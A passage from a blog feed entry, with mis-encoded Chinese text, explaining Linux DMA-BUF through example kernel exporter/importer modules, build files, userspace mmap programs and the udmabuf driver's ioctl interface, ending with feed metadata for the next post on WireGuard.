class="hljs-title">direction</span> =</span> DMA_BIDIRECTIONAL;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> *<span class="hljs-title">sgt</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> *<span class="hljs-title">sg</span>;</span><br>    <span class="hljs-type">size_t</span> bufsz;<br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (!a3dmabuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] No dma_buf got! &quot;</span><br>               <span class="hljs-string">&quot;Exporter not working properly?\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br><br>    attach = dma_buf_attach(a3dmabuf, mdev);<br>    <span class="hljs-keyword">if</span> (IS_ERR(attach)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] Unable to attach to dma_buf!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> PTR_ERR(attach);<br>    &#125;<br><br>    sgt = dma_buf_map_attachment(attach, direction);<br>    <span class="hljs-keyword">if</span> (IS_ERR(sgt)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3importer:] Unable to map the dma_buf!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> PTR_ERR(sgt);<br>    &#125;<br><br>    for_each_sg(sgt-&gt;sgl, sg, sgt-&gt;nents, i) &#123;<br>        buf = (<span class="hljs-type">char</span>*) sg_dma_address(sg) + page_offset_base;<br>        bufsz = sg_dma_len(sg);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> loc = <span class="hljs-number">0</span>; loc &lt; bufsz; loc += PAGE_SIZE) &#123;<br>            printk(KERN_INFO <span class="hljs-string">&quot;[a3importer:] Got data: %s\n&quot;</span>, buf + loc);<br>        &#125;<br>    &#125;<br><br>    dma_buf_unmap_attachment(attach, sgt, direction);<br><br>    dma_buf_detach(a3dmabuf, attach);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3importer_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    barrier();<br>    <span class="hljs-keyword">return</span> a3importer_create_dev() || a3importer_import_dmabuf();<br>&#125;<br></code></pre></td></tr></table></figure><p>Makefile ç¼–å†™å¦‚ä¸‹ï¼Œåˆ«å¿˜äº†æ›¿æ¢ kernel è·¯å¾„ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CURRENT_PATH := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br>LINUX_KERNEL_SRC := your_path_to_kernel_build,e.g.,/lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br>CC=clang<br><br><span class="hljs-section">all:</span><br>make CC=<span class="hljs-variable">$(CC)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> modules<br><span class="hljs-section">clean:</span><br>make CC=<span class="hljs-variable">$(CC)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> clean<br><br></code></pre></td></tr></table></figure><p>Kbuild ç¼–å†™å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kbuild">EXPORTER_MODULE_NAME ?= exporter-test<br>IMPORTER_MODULE_NAME ?= importer-test<br><br>obj-m += $(EXPORTER_MODULE_NAME).o<br>obj-m += $(IMPORTER_MODULE_NAME).o<br><br>$(EXPORTER_MODULE_NAME)-y += exporter.o<br>$(IMPORTER_MODULE_NAME)-y += importer.o<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ï¼ŒæˆåŠŸå®Œæˆå†…æ ¸é©±åŠ¨é—´çš„æ•°æ®ä¼ é€’ï¼š</p><p><img src="https://s2.loli.net/2024/12/31/rXuWZY1g78wjGFK.png"></p><h2 id="importer-åº”ç”¨ç¨‹åºç¤ºä¾‹"><a href="#importer-åº”ç”¨ç¨‹åºç¤ºä¾‹" class="headerlink" title="importer åº”ç”¨ç¨‹åºç¤ºä¾‹"></a>importer åº”ç”¨ç¨‹åºç¤ºä¾‹</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ç§å¯èƒ½æ›´å¸¸è§çš„ DMA-BUF çš„ä½¿ç”¨åœºæ™¯ï¼šç”±å†…æ ¸æ€ exporter é©±åŠ¨å¯¼å‡ºç»™ç”¨æˆ·æ€åº”ç”¨ç¨‹åºï¼Œåœ¨è¿™ç§åœºæ™¯ä¸‹ exporter éœ€è¦å°† <code>dma_buf</code> é€šè¿‡ <code>dma_buf_fd()</code> å°è£…åˆ°ä¸€ä¸ª <strong>æ–°åˆ†é…çš„æ–‡ä»¶æè¿°ç¬¦</strong>å½“ä¸­ä¼ é€’ç»™ç”¨æˆ·æ€ï¼Œç”¨æˆ·æ€å†é€šè¿‡ <code>mmap()</code> æ˜ å°„è¯¥æ–‡ä»¶æè¿°ç¬¦ä»¥ä½¿ç”¨è¿™å—å…±äº«å†…å­˜</p><p><img src="https://s2.loli.net/2024/12/31/JZ95bEQ67OG1V48.png"></p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥åœ¨è®¾å¤‡èŠ‚ç‚¹çš„ <code>ioctl()</code> å½“ä¸­å®ç°è¯¥åŠŸèƒ½ï¼Œåœ¨ä¸Šé¢çš„é©±åŠ¨ä»£ç ä¸­å¢åŠ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">a3exporter_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> args)</span><br>&#123;<br>    <span class="hljs-type">int</span> buf_fd;<br><br>    <span class="hljs-keyword">if</span> (cmd != <span class="hljs-number">0xdeadbeef</span>) &#123;<br>        <span class="hljs-keyword">return</span> -EINVAL;<br>    &#125;<br><br>    buf_fd = dma_buf_fd(a3dmabuf, O_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (buf_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(<span class="hljs-string">&quot;[a3exporter:] Unable to allocate new file descriptor.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EMFILE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_to_user((<span class="hljs-type">void</span>*) args, &amp;buf_fd, <span class="hljs-keyword">sizeof</span>(buf_fd))) &#123;<br>        printk(<span class="hljs-string">&quot;[a3exporter:] Unable to copy dma_buf fd to userland.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">a3exporter_dev_fops</span> =</span> &#123;<br>    .unlocked_ioctl = a3exporter_ioctl,<br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œç”±äºç”¨æˆ·æ€é€šè¿‡è°ƒç”¨ <code>mmap()</code> æ¥ä½¿ç”¨è¿™å—å†…å­˜ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦åœ¨ exporter é©±åŠ¨å½“ä¸­å®ç° <code>dma_buf_ops::mmap()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3exporter_buf_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> remap_pfn_range(<br>        vma,<br>        vma-&gt;vm_start,<br>        page_to_pfn(virt_to_page(buf-&gt;priv)),<br>        buf-&gt;size,<br>        vma-&gt;vm_page_prot<br>    );<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">a3exporter_dmabuf_ops</span> =</span> &#123;<br>    .mmap           = a3exporter_buf_mmap,<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬å®ç° importer åº”ç”¨ç¨‹åºï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨ <code>ioctl()</code> è·å– <code>dma_buf</code> çš„æ–‡ä»¶æè¿°ç¬¦å¹¶ç”¨ <code>mmap()</code> è¿›è¡Œæ˜ å°„å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd;<br>    <span class="hljs-type">char</span> *buf;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/a3exporter-dev&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(ioctl(dev_fd, <span class="hljs-number">0xdeadbeef</span>, &amp;dma_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to ioctl dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    buf = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, PROT_READ|PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!buf) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %s\n&quot;</span>, &amp;buf[<span class="hljs-number">0x1000</span> * i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ï¼ŒæˆåŠŸå®Œæˆå†…æ ¸åˆ°ç”¨æˆ·æ€çš„æ•°æ®ä¼ é€’ï¼š</p><p><img src="https://s2.loli.net/2024/12/31/MQbFuS1cDP7htm3.png"></p><blockquote><p> å½“ç„¶ï¼Œå†…æ ¸çš„å¼€å‘å®é™…ä¸Šæ˜¯éå¸¸çµæ´»çš„ï¼Œäº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å®ç°è®¾å¤‡æ–‡ä»¶æ¥å£çš„ <code>mmap()</code> å¹¶åœ¨å…¶ä¸­æ˜ å°„ <code>dma_buf</code> ï¼Œä»è€Œç®€åŒ–ä»£ç æµç¨‹ï¼šï¼‰</p></blockquote><h1 id="0x03-udmabufï¼šç®€æ˜“å°è£…æ¥å£"><a href="#0x03-udmabufï¼šç®€æ˜“å°è£…æ¥å£" class="headerlink" title="0x03. udmabufï¼šç®€æ˜“å°è£…æ¥å£"></a>0x03. udmabufï¼šç®€æ˜“å°è£…æ¥å£</h1><p>å¾—ç›Šäº <code>dma_buf</code> çš„å¥½ç”¨ï¼ŒLinux kernel <a href="https://patchwork.kernel.org/project/qemu-devel/patch/20180313154826.20436-1-kraxel@redhat.com/">äº 2018 å¹´</a>å¼•å…¥äº†ä¸€ä¸ªå°è£…å¥½çš„ <code>dma_buf</code> è®¾å¤‡é©±åŠ¨â€”â€”<code>udmabuf</code> ï¼Œå…¶åœ¨å†…æ ¸ä¸­å®ç°äº†ä¸€ä¸ªå°è£…å¥½çš„ exporterï¼Œå¹¶æ”¯æŒé€šè¿‡ <code>ioctl()</code> åˆ›å»º <code>dma_buf</code> ä»¥åœ¨ç”¨æˆ·æ€ç¨‹åºä¹‹é—´è¿›è¡Œå†…å­˜å…±äº«</p><h2 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h2><p><code>udmabuf</code> çš„åŸºæœ¬ä½¿ç”¨æ–¹å¼éå¸¸ç®€å•ï¼š</p><ul><li>ä½¿ç”¨ <code>memfd_create()</code> åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦</li><li>å°è£… <code>udmabuf_create</code> è¯·æ±‚ï¼Œé€šè¿‡ <code>ioctl(&quot;/dev/udmabuf&quot;)</code> è·å– <code>dma_buf</code> çš„ fd</li><li>é€šè¿‡ <code>mmap()</code> è¿›è¡Œè®¿é—®</li></ul><p>æœ‰äº† <code>dma_buf</code> çš„ fdï¼Œåé¢çš„å†…å­˜è®¿é—®æ“ä½œå°±å’Œä¹‹å‰æ²¡ä»€ä¹ˆåŒºåˆ«äº†ï¼Œåœ¨è¿›ç¨‹é—´è¿›è¡Œå…±äº«åªéœ€è¦å…±äº«è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦å³å¯ï¼ˆä¾‹å¦‚ä½¿ç”¨ UNIX domain socketï¼‰</p><p>è¿™é‡Œç»™å‡ºä¸€ä¸ªç¤ºä¾‹ç¨‹åºï¼Œæ–‡ä»¶æè¿°ç¬¦ç›´æ¥é€šè¿‡ <code>fork()</code> å…±äº«ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd;<br>    <span class="hljs-type">char</span> *buf1, *buf2;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>;<br><br>    dma_fd = ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    buf1 = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, PROT_READ | PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!buf1) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        *(<span class="hljs-type">size_t</span>*) &amp;buf1[i * <span class="hljs-number">0x1000</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba0&quot;</span>;<br>        buf1[i * <span class="hljs-number">0x1000</span> + <span class="hljs-number">7</span>] += i;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        buf2 = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, PROT_READ|PROT_WRITE, MAP_FILE | MAP_SHARED, dma_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!buf2) &#123;<br>            perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %s\n&quot;</span>, &amp;buf2[<span class="hljs-number">0x1000</span> * i]);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æµ‹è¯•ï¼ŒæˆåŠŸå®Œæˆæ•°æ®ä¼ é€’ï¼š</p><p><img src="https://s2.loli.net/2024/12/31/JOojDcGvU4XK1T5.png"></p><h2 id="å†…éƒ¨å®ç°ï¼ˆğŸ•Šï¼‰"><a href="#å†…éƒ¨å®ç°ï¼ˆğŸ•Šï¼‰" class="headerlink" title="å†…éƒ¨å®ç°ï¼ˆğŸ•Šï¼‰"></a>å†…éƒ¨å®ç°ï¼ˆğŸ•Šï¼‰</h2><p>udmabuf çš„å®ç°éå¸¸ç®€å•ï¼Œä¸»è¦å°±æ˜¯æ³¨å†Œäº†ä¸€ä¸ªæ‚é¡¹è®¾å¤‡ <code>/dev/udmabuf</code> ï¼Œå¹¶æ”¯æŒä¸¤ä¸ªè‡ªå®šä¹‰çš„ IOCTL å‘½ä»¤ï¼š</p><blockquote><p>&#x2F;drivers&#x2F;dma-buf&#x2F;udmabuf.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">udmabuf_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-type">long</span> ret;<br><br><span class="hljs-keyword">switch</span> (ioctl) &#123;<br><span class="hljs-keyword">case</span> UDMABUF_CREATE:<br>ret = udmabuf_ioctl_create(filp, arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> UDMABUF_CREATE_LIST:<br>ret = udmabuf_ioctl_create_list(filp, arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>ret = -ENOTTY;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">udmabuf_fops</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.unlocked_ioctl = udmabuf_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_ioctl   = udmabuf_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">miscdevice</span> <span class="hljs-title">udmabuf_misc</span> =</span> &#123;<br>.minor          = MISC_DYNAMIC_MINOR,<br>.name           = <span class="hljs-string">&quot;udmabuf&quot;</span>,<br>.fops           = &amp;udmabuf_fops,<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸–ç•Œç¬¬ä¸€ DMA-BUF å¤§å¸ˆæ˜¯å¯¹çš„ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="DMA-BUF" scheme="https://arttnba3.github.io/tags/DMA-BUF/"/>
    
  </entry>
  
  <entry>
    <title>ã€OPS.0x04ã€‘ä½¿ç”¨ Wireguard è¿›è¡Œå¼‚åœ°ç»„ç½‘</title>
    <link href="https://arttnba3.github.io/2024/10/23/OPS-0X04-WIREGUARD_VPN/"/>
    <id>https://arttnba3.github.io/2024/10/23/OPS-0X04-WIREGUARD_VPN/</id>
    <published>2024-10-22T13:26:19.000Z</published>
    <updated>2025-06-30T16:00:19.619Z</updated>
    
